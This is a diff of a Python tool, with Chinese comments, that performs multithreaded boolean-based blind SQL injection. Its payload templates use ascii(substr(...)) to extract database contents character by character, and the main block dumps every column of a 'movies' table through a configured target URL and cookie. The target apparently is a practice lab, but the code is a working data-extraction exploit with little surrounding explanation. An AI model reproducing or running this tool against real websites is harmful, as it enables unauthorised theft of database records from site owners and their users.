@@ -25,7 +25,7 @@ class datadump_thread():
         self.row_order = row_order
         self.rowcount = rowcount
         self.columndata = []  # 一列的数据
-        self.full_data_dict={'coname':coname_list}
+        self.full_data_dict = {'coname': coname_list}
 
         self.ascii_value = ["0", "32", "46", "58", "95"]  # NULL (SPACE) . : _
 
@@ -54,6 +54,19 @@ class datadump_thread():
             self.payload = '%\'+or+if((select+ascii(substr((select+{coname}+from+' + self.tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)%23'
 
     # 读取列数据
+    def use_threadpool_to_get_single_column_data(self):
+
+        executor = ThreadPoolExecutor(max_workers=100)
+        row_orderlist = []
+
+        for i in range(0, self.rowcount):
+            row_orderlist.append(i)
+
+        for data in executor.map(self.get_single_data_by_response_length, row_orderlist):
+            self.columndata.append(data)
+
+        print(self.columndata)
+
     def get_single_data_by_response_length(self, row_order):
 
         local_data.row_order = row_order
@@ -67,7 +80,8 @@ class datadump_thread():
 
         for j in self.ascii_value:
 
-            full_payload = self.url + self.payload.format(coname=str(local_data.coname),data_row_order=str(local_data.row_order),
+            full_payload = self.url + self.payload.format(coname=str(local_data.coname),
+                                                          data_row_order=str(local_data.row_order),
                                                           data_location=str(1),
                                                           ascii_number=str(j))
 
@@ -88,7 +102,8 @@ class datadump_thread():
 
                 local_data.fuc_start = time.time()
 
-                full_payload = self.url + self.payload.format(coname=str(local_data.coname),data_row_order=str(local_data.row_order),
+                full_payload = self.url + self.payload.format(coname=str(local_data.coname),
+                                                              data_row_order=str(local_data.row_order),
                                                               data_location=str(k),
                                                               ascii_number=str(j))
 
@@ -127,6 +142,15 @@ class datadump_thread():
         return local_data.return_data
 
     # 读取行数据
+    def use_threadpool_to_get_singe_row_data(self):
+
+        executor = ThreadPoolExecutor(max_workers=100)
+
+        for data in executor.map(self.get_single_data_by_response_length2, self.coname_list):
+            self.columndata.append(data)
+
+        print(self.columndata)
+
     def get_single_data_by_response_length2(self, coname):
 
         local_data.coname = coname
@@ -202,6 +226,24 @@ class datadump_thread():
         return local_data.return_data
 
     # 读取全表数据
+    def use_threadpool_to_get_full_data(self):
+
+        executor = ThreadPoolExecutor(max_workers=100)
+
+        for i in range(0, self.rowcount):
+            self.row_order = i
+
+            for data in executor.map(self.get_single_data_by_response_length2, self.coname_list):
+                self.columndata.append(data)
+
+            print(self.columndata)
+
+            self.full_data_dict[self.row_order] = self.columndata
+
+        print(self.full_data_dict)
+
+        return self.full_data_dict
+
     def get_single_data_by_response_length3(self, coname):
 
         local_data.coname = coname
@@ -212,8 +254,6 @@ class datadump_thread():
 
         local_data.single_data = ''
         local_data.return_data = ''
-
-
 
         for j in self.ascii_value:
 
@@ -278,72 +318,19 @@ class datadump_thread():
 
         return local_data.return_data
 
-    def use_threadpool_to_get_single_column_data(self):
-
-        executor = ThreadPoolExecutor(max_workers=100)
-        row_orderlist = []
-
-        for i in range(0, self.rowcount):
-            row_orderlist.append(i)
-
-        for data in executor.map(self.get_single_data_by_response_length, row_orderlist):
-            self.columndata.append(data)
-
-        print(self.columndata)
-
-
-
-    def use_threadpool_to_get_singe_row_data(self):
-
-        executor = ThreadPoolExecutor(max_workers=100)
-
-        for data in executor.map(self.get_single_data_by_response_length2, self.coname_list):
-            self.columndata.append(data)
-
-        print(self.columndata)
-
-
-
-    def use_threadpool_to_get_full_data(self):
-
-        executor = ThreadPoolExecutor(max_workers=100)
-
-        for i in range(0,self.rowcount):
-            self.row_order=i
-
-            for data in executor.map(self.get_single_data_by_response_length2, self.coname_list):
-
-                self.columndata.append(data)
-
-            print(self.columndata)
-
-            self.full_data_dict[self.row_order]=self.columndata
-
-        print(self.full_data_dict)
-
 
 
 if __name__ == "__main__":
-    t1 = datadump_thread(url=glovar.url4, cookie=glovar.cookie, type='int', tbname='movies', coname_list=['id', 'title', 'release_year', 'genre', 'main_character', 'imdb', 'tickets_stock'],coname='title', rowcount=10)
+    t1 = datadump_thread(url=glovar.url4, cookie=glovar.cookie, type='int', tbname='movies',
+                         coname_list=['id', 'title', 'release_year', 'genre', 'main_character', 'imdb',
+                                      'tickets_stock'], coname='title', rowcount=10)
 
     # t1 = datadump_thread(url=glovar.url3, cookie=False, type='search', tbname='comment',coname_list=['comment_id', 'user_name', 'comment_text'],coname='comment_text',rowcount=9)
 
-    #t1.use_threadpool_to_get_single_column_data()
+    # t1.use_threadpool_to_get_single_column_data()
 
-    #t1.use_threadpool_to_get_single_row_data()
+    # t1.use_threadpool_to_get_single_row_data()
 
-    t1.use_threadpool_to_get_full_data()
+    data_dict = t1.use_threadpool_to_get_full_data()
 
 
-    # print(get_coname.get_coname(glovar.url4, cookie=glovar.cookie, type='int', tbname='movies',cocount=7))
-    #
-    # list1 = [1, 2, 3]
-    # list2 = [4, 5, 6]
-    # list3 = [7, 8, 9]
-    # dic1 = {1: list1, 2: list2}
-    # dic1['3']=list3
-    #
-    # print('1:'+str(dic1[1]))
-    # print('2:'+str(dic1[2]))
-    # print('3:'+str(dic1["3"]))
-    # print(dic1)
